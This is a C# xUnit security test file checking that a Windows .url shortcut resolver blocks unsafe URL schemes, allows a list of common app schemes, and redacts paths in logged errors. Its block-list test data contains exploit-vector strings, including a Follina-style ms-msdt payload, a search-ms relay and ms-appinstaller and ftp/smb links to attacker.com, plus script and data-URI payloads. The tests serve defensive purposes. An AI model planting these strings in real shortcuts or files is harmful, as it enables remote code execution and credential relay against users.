using Launchbox.Helpers;
using Launchbox.Services;
using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using Xunit;

namespace Launchbox.Tests;

[Trait("Category", "Security")]
public class WindowsShortcutResolverSecurityTests : IDisposable
{
    private readonly StringBuilder _traceOutput = new();
    private readonly TextWriterTraceListener _listener;

    public WindowsShortcutResolverSecurityTests()
    {
        _listener = new TextWriterTraceListener(new StringWriter(_traceOutput));
        Trace.Listeners.Add(_listener);
    }

    public void Dispose()
    {
        Trace.Listeners.Remove(_listener);
        _listener.Dispose();
    }

    [Theory]
    // Filesystem / network access schemes
    [InlineData("file://C:/Windows/System32/calc.exe")]
    [InlineData("ftp://attacker.com/malware.exe")]
    [InlineData("smb://attacker.com/share/malware.exe")]
    // Script execution
    [InlineData("javascript:alert(1)")]
    [InlineData("vbscript:MsgBox(1)")]
    // Data URI
    [InlineData("data:text/html,<script>alert(1)</script>")]
    // Known Windows exploit vectors (Follina, Emotet, search-ms relay)
    [InlineData("ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu\"")]
    [InlineData("search-ms:query=malware&crumb=location:\\\\attacker.com\\share")]
    [InlineData("ms-appinstaller:?source=https://attacker.com/malware.appinstaller")]
    [InlineData("shell:startup")]
    // Bare filesystem path masquerading as URL
    [InlineData(@"C:\Windows\System32\cmd.exe")]
    public void ResolveTarget_BlocksUnsafeUrlSchemes(string unsafeUrl)
    {
        // Arrange
        var fileSystem = new MockFileSystem();
        var resolver = new WindowsShortcutResolver(fileSystem);
        string shortcutPath = @"C:\shortcuts\unsafe.url";
        fileSystem.SetIniValue(shortcutPath, "InternetShortcut", "URL", unsafeUrl);

        // Act
        var result = resolver.Resolve(shortcutPath)?.Target;

        // Assert
        Assert.Null(result);
    }

    [Theory]
    // Web
    [InlineData("https://github.com")]
    [InlineData("http://localhost:8080/")]
    // Email / telephony
    [InlineData("mailto:someone@example.com")]
    [InlineData("tel:+15555555555")]
    // Gaming clients
    [InlineData("steam://rungameid/3326230")]
    [InlineData("com.epicgames.launcher://apps/fortnite?action=launch")]
    [InlineData("xbox://")]
    [InlineData("goggalaxy://open/game/123")]
    [InlineData("battlenet://Heroes/")]
    [InlineData("uplay://launch/1234/0")]
    // Communication
    [InlineData("discord://channels/@me")]
    [InlineData("slack://open")]
    [InlineData("zoommtg://zoom.us/join?confno=12345")]
    [InlineData("msteams://l/meetup-join/123")]
    [InlineData("tg://resolve?domain=username")]
    // Media / productivity
    [InlineData("spotify:track:4uLU6hMCjMI75M1A2tKUQC")]
    [InlineData("obsidian://open?vault=Notes")]
    [InlineData("vscode://file/C:/project/README.md")]
    // Safe Windows utilities
    [InlineData("ms-settings:display")]
    [InlineData("ms-windows-store://home")]
    [InlineData("ms-calculator:")]
    public void ResolveTarget_AllowsSafeNonHttpSchemes(string safeUrl)
    {
        var fileSystem = new MockFileSystem();
        var resolver = new WindowsShortcutResolver(fileSystem);
        string shortcutPath = @"C:\shortcuts\app.url";
        fileSystem.SetIniValue(shortcutPath, "InternetShortcut", "URL", safeUrl);

        var result = resolver.Resolve(shortcutPath)?.Target;

        Assert.Equal(safeUrl, result);
    }

    [Fact]
    public void ResolveTarget_RedactsExceptionMessage()
    {
        // Arrange
        var faultyFileSystem = new FaultyFileSystem();
        var resolver = new WindowsShortcutResolver(faultyFileSystem);
        string sensitivePath = @"C:\Users\Admin\Documents\Secret\shortcut.url";
        string sensitiveMessage = $"Could not access {sensitivePath}";

        faultyFileSystem.SetExceptionToThrow(new IOException(sensitiveMessage));

        // Act
        var result = resolver.Resolve(sensitivePath)?.Target;

        // Assert
        _listener.Flush();
        string logs = _traceOutput.ToString();

        // It should NOT contain the sensitive message
        Assert.DoesNotContain(sensitiveMessage, logs);

        // It should contain the redacted path (via PathSecurity.RedactPath)
        Assert.Contains(PathSecurity.RedactPath(sensitivePath), logs);

        // It should contain the safe exception message ([IOException])
        Assert.Contains("[IOException]", logs);

        Assert.Null(result);
    }

    private class FaultyFileSystem : MockFileSystem
    {
        private Exception? _exceptionToThrow;

        public void SetExceptionToThrow(Exception ex)
        {
            _exceptionToThrow = ex;
        }

        public override string GetIniValue(string path, string section, string key)
        {
            if (_exceptionToThrow != null)
            {
                throw _exceptionToThrow;
            }
            return base.GetIniValue(path, section, key);
        }
    }
}
